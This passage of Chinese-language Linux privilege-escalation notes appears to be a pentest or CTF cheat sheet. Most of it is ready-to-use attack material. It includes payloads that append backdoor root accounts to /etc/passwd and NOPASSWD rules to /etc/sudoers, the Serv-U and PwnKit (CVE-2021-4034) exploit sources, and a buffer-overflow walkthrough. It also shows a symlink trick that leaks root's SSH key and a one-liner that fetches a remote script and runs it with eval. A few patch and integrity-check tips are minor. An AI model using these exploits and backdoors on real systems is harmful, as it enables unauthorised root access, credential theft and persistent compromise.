easily take advantage of this.

Suggested fix: Put quotation marks around the assignment.

file_port="$file_port $i"

I will also try to contact upstream, although the latest version of
chkrootkit dates back to 2009 - will have to see, if I reach a dev there.# 
```

利用步骤是在/tmp文件夹下创建 update文件，然后允许以 root方式运行 chkrootkit即可

因为目标系统会通过定时任务运行 chkrootkit，所以利用起来很简单。在/tmp创建一个update文件，chkrootkit 就会定时运行、

利用方法：

增加超级用户法：

修改完成，然后我们只需添加一个 `root`权限账户到`/etc/passwd`文件中即可

```
1、生成自定义的新密码
	mkpasswd -m sha-512
	密码：123456
	或 
	openssl passwd -1 123456

	echo 'test:$6$p7H73wlaIu771Bee$lzlH8TvKZjJzjnQbxHco2eA6aZ4MnyTnF57zMaVoafyDj70PH73PcFqGdusN2XNJinj.eDTTGBzj4CgGhYCmd/:0:0:root:/root:/bin/bash' >> /etc/passwd
```

尝试切换账户：

增加sudo权限法：
```
echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers
```

playlods

```
echo 'echo "ALL ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers' > /tmp/update

echo 'test:$6$p7H73wlaIu771Bee$lzlH8TvKZjJzjnQbxHco2eA6aZ4MnyTnF57zMaVoafyDj70PH73PcFqGdusN2XNJinj.eDTTGBzj4CgGhYCmd/:0:0:root:/root:/bin/bash' >> /etc/passwd

chmod 777 /tmp/update
```

## 6.21、Serv-U 提权

通杀漏洞：
```
┌──(nerubian㉿kali)-[~/vulnhub]
└─$ searchsploit Serv-U Privilege

 Exploit Title                         |  Path
-------------------------------------------------------- -----------------
RhinoSoft Serv-U FTP Server 3.x < 5.x - Local Privilege Escalation        | windows/local/381.c
Serv-U FTP Server - prepareinstallation Privilege Escalation (Metasploit) | linux/local/47072.rb
Serv-U FTP Server - prepareinstallation Privilege Escalation (Metasploit) | linux/local/47072.rb
Serv-U FTP Server < 15.1.7 - Local Privilege Escalation (1)               | linux/local/47009.c
Serv-U FTP Server < 15.1.7 - Local Privilege Escalation (2)               | multiple/local/47173.sh
```

47009.c
```
#include <stdio.h>
#include <unistd.h>
#include <errno.h>

int main()
{
    char *vuln_args[] = {"\" ; id; echo 'opening root shell' ; /bin/sh; \"", "-prepareinstallation", NULL};
    int ret_val = execv("/usr/local/Serv-U/Serv-U", vuln_args);
    // if execv is successful, we won't reach here
    printf("ret val: %d errno: %d\n", ret_val, errno);
    return errno;
}
```
利用执行
```
gcc 47009.c -o pe && ./pe
```

## 6.22、suForce

爆破
github：https://github.com/d4t4s3c/suForce

## 6.23、busybox
突破命令屏蔽


## 6.24、python Capabilities cap\_sys\_ptrace+ep提权

https://www.cnblogs.com/zlgxzswjy/p/15185591.html
```
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

## 6.24、C语言缓冲区溢出漏洞提权[未完成]
C源码
```c
└─$ cat install.c
#include <stdio.h>
#include <stdlib.h>
void spawn_shell()
{
     setuid(0);
     system("/bin/bash");
}

int main()
{
      char buff[30];
      const char *env = getenv("INSTALLED");
      if(env != NULL)
      {
        strcpy(buff,env);
        printf("%s\n",buff);
      }

      else
      {
         system("sudo apt install sl");
         system("export INSTALLED=OK");
      }
     return 0;
}
```

漏洞分析:
1. ​**​关键漏洞点​**​  
    程序通过`strcpy(buff, env)`将环境变量`INSTALLED`的值复制到`char buff[30]`中，但未进行边界检查
    。若`INSTALLED`的值超过30字节，会导致缓冲区溢出，覆盖栈上的返回地址。
2. ​**​提权目标函数​**​  
    `spawn_shell()`函数调用`setuid(0)`将用户ID设为root，并通过`system("/bin/bash")`启动具有root权限的shell。若能劫持程序流程跳转至此函数，即可提权
#### 步骤1：计算溢出偏移量

- ​**​缓冲区结构​**​：  
    栈中`buff`分配30字节，其后是保存的`ebp`（4字节）和函数返回地址（4字节）。因此需构造 ​**​34字节填充数据​**​ 覆盖到返回地址位置
#### 步骤2：获取`spawn_shell()`地址

1. ​**​通过调试工具获取​**​：  
    使用`gdb`或`objdump`查看函数地址：
    ```bash
    gdb install.c
    (gdb) disassemble spawn_shell  # 获取函数地址，如0x08048456
    ```
2. ​**​地址格式转换​**​：  
    需将地址转为小端序（Little-Endian）。例如地址`0x08048456`对应的payload为`\x56\x84\x04\x08`。
#### 步骤3：构造恶意环境变量

1. ​**​生成payload​**​：  
    构造34字节填充数据 + `spawn_shell()`地址：
    ```bash
    export INSTALLED=$(python -c 'print "A"*34 + "\x56\x84\x04\x08"')
    ```
2. ​**​触发漏洞​**​：  
    运行程序，环境变量溢出覆盖返回地址：

    ```bash
    ./install
    ```
    程序将执行`spawn_shell()`，获得root权限的bash shell。

## 6.25 核查已安装软件包文件完整性
 Debian 系（Debian、Ubuntu 等）
```sh
dpkg -V
```

Red Hat 系（Red Hat、CentOS、Fedora 等）
```sh
rpm -Va
```

Arch Linux
```
pacman -Qkk
```

Gentoo
```sh
qlist -I | xargs equery check
```
## 6.98 其他提权经验记录

### (ALL) NOPASSWD: /usr/bin/mosh-server
```
mosh --server="sudo /usr/bin/mosh-server" localhost
```
### (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png

massage
```bash
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
bob@linkvortex:~$ ll /opt/ghost/clean_symlink.sh
-rwxr--r-- 1 root root 745 Nov  1 08:46 /opt/ghost/clean_symlink.sh*

```

脚本
```bash
bob@linkvortex:~$ cat /opt/ghost/clean_symlink.sh
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```
payload
```bash
ln -s /root/.ssh/id_rsa 123
ln -s /home/bob/123 123.png
sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh 123.png

ssh -i root_idrsa root@linkvortex.htb
```
## 6.99、内核提权

### 漏洞信息检索

https://www.kernel-exploits.com/
https://www.exploit-db.com/

```
#利用检索
searchsploit Linux kernel 3.10

#利用过滤：
	#1、过滤提权利用
		searchsploit Linux kernel 3.10 |grep 'Privilege Escalation'
	#2、过滤到精确利用
		a>可以在搜索引擎搜索同版本号的有效利用记录
		b>参考linpeas.sh的建议

#复制利用到当前目录
searchsploit -m 12345.txt

#检查利用中是否有针对使用者的恶意代码
cat 12345.txt
```

### 工具：

http://github.com/mzet-/linux-exploit-suggester

```

```

### 内核漏洞提权示例


```
# 编译
gcc hello.c -o a/hello.out
gcc C源代码文件 -o C输出文件

# 执行
chmod +x C输出文件
./C输出文件
```

### Ubuntu 权限提升通杀漏洞  【CVE-2021-4034】

简介

```
2021年，Qualys研究团队公开披露了在Polkit的pkexec 中发现的一个权限提升漏洞，也被称为PwnKit。该漏洞是由于pkexec 没有正确处理调用参数，导致将环境变量作为命令执行，攻击者可以通过构造环境变量的方式，诱使pkexec执行任意代码使得非特权本地用户获取到root的权限。
```

影响范围（受影响的主流Linux发行版本）：

```
Ubuntu 21.10 (Impish Indri) policykit-1 < 0.105-31ubuntu0.1 
Ubuntu 21.04 (Hirsute Hippo) policykit-1 Ignored (reached end-of-life) 
Ubuntu 20.04 LTS (Focal Fossa) policykit-1 < Released (0.105-26ubuntu1.2) 
Ubuntu 18.04 LTS (Bionic Beaver) policykit-1 < Released (0.105-20ubuntu0.18.04.6) 
Ubuntu 16.04 ESM (Xenial Xerus) policykit-1 < Released (0.105-14.1ubuntu0.5+esm1) 
Ubuntu 14.04 ESM (Trusty Tahr) policykit-1 < Released (0.105-4ubuntu3.14.04.6+esm1) 

CentOS 6 polkit < polkit-0.96-11.el6_10.2 
CentOS 7 polkit < polkit-0.112-26.el7_9.1 
CentOS 8.0 polkit < polkit-0.115-13.el8_5.1 
CentOS 8.2 polkit < polkit-0.115-11.el8_2.2 
CentOS 8.4 polkit < polkit-0.115-11.el8_4.2 

Debain stretch policykit-1 < 0.105-18+deb9u2 
Debain buster policykit-1 < 0.105-25+deb10u1 
Debain bookworm, bullseye policykit-1 < 0.105-31.1 
```

版本查看

```
pkaction --version
dpkg -l policykit-1
rpm -qa polkit
```

利用查找

https://github.com/berdav/CVE-2021-4034

http://192.168.219.134:8000/CVE-2021-4034-main.zip 

或者：

```
┌──(nerubian㉿kali)-[~]
└─$ searchsploit --cve CVE-2021-4034                                                                                     
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
PolicyKit-1 0.105-31 - Privilege Escalation                                                                               | linux/local/50689.txt
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

┌──(nerubian㉿kali)-[~]
└─$ searchsploit -m 50689           
  Exploit: PolicyKit-1 0.105-31 - Privilege Escalation
      URL: https://www.exploit-db.com/exploits/50689
     Path: /usr/share/exploitdb/exploits/linux/local/50689.txt
    Codes: CVE-2021-4034
 Verified: False
File Type: C source, ASCII text
Copied to: /home/nerubian/50689.txt

┌──(nerubian㉿kali)-[~]
└─$ cat 50689.txt 
# Exploit Title: PolicyKit-1 0.105-31 - Privilege Escalation
# Exploit Author: Lance Biggerstaff
# Original Author: ryaagard (https://github.com/ryaagard)
# Date: 27-01-2022
# Github Repo: https://github.com/ryaagard/CVE-2021-4034
# References: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt

# Description: The exploit consists of three files `Makefile`, `evil-so.c` & `exploit.c`

##### Makefile #####

all:
	gcc -shared -o evil.so -fPIC evil-so.c
	gcc exploit.c -o exploit

clean:
	rm -r ./GCONV_PATH=. && rm -r ./evildir && rm exploit && rm evil.so

#################

##### evil-so.c #####

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv() {}

void gconv_init() {
    setuid(0);
    setgid(0);
    setgroups(0);

    execve("/bin/sh", NULL, NULL);
}

#################

##### exploit.c #####

#include <stdio.h>
#include <stdlib.h>

#define BIN "/usr/bin/pkexec"
#define DIR "evildir"
#define EVILSO "evil"

int main()
{
    char *envp[] = {
        DIR,
        "PATH=GCONV_PATH=.",
        "SHELL=ryaagard",
        "CHARSET=ryaagard",
        NULL
    };
    char *argv[] = { NULL };

    system("mkdir GCONV_PATH=.");
    system("touch GCONV_PATH=./" DIR " && chmod 777 GCONV_PATH=./" DIR);
    system("mkdir " DIR);
    system("echo 'module\tINTERNAL\t\t\tryaagard//\t\t\t" EVILSO "\t\t\t2' > " DIR "/gconv-modules");
    system("cp " EVILSO ".so " DIR);

    execve(BIN, argv, envp);

    return 0;
}

#################

```

利用执行

可联网环境可以使用单行命令

```
eval "$(curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh)"
```

```
wget https://github.com/berdav/CVE-2021-4034/archive/refs/heads/main.zip

```

四、修复建议

更新官方补丁，下载地址：https://gitlab.freedesktop.org/polkit/polkit/-/commit/a2bf5c9c83b6ae46cbd5c779d3055bff81ded683

根据不同厂商的修复建议或安全通告进行防护。

Redhat：https://access.redhat.com/security/cve/CVE-2021-4034

Ubuntu：https://ubuntu.com/security/CVE-2021-4034

Debian：https://security-tracker.debian.org/tracker/CVE-2021-4034

临时防护可以移除 pkexec 的 suid位。

chmod 0755 /usr/bin/pkexec 作者：蜗牛学苑 https://www.bilibili.com/read/cv22967681/ 出处：bilibili
## 参考资料

- [2021.04.06] - <https://i.hacking8.com/tiquan/> - 提权辅助网页 Windows提权辅助
- [2021.04.06] - <https://github.com/Ascotbe/Kernelhub> - Windows 提权漏洞合集(带有编译环境/详细说明)
- [2021.04.06] - <https://github.com/SecWiki/windows-kernel-exploits> - windows-kernel-exploits Windows平台提权漏洞集合
- [2021.04.06] - <https://github.com/SecWiki/linux-kernel-exploits> - linux-kernel-exploits Linux平台提权漏洞集合
- [2021.04.06] - <https://github.com/worawit/CVE-2021-3156> - CVE-2021-3156 sudo 提权漏洞 各平台下的EXP
- [2021.04.06] - <https://github.com/FireFart/dirtycow> - CVE-2016-5195 脏牛漏洞提权EXP
- [2021.04.14] - <https://github.com/liamg/traitor> - 自动化Linux权限提升工具
- [2021.06.22] - [PowerShell 脚本可快速查找本地提权漏洞的缺失软件补丁](https://github.com/rasta-mouse/Sherlock)
- https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/



windows提权

- http://www.fuzzysecurity.com/tutorials/16.html
- http://toshellandback.com/2015/11/24/ms-priv-esc/

# 权限临时维持
```
echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
exit
sudo su -
```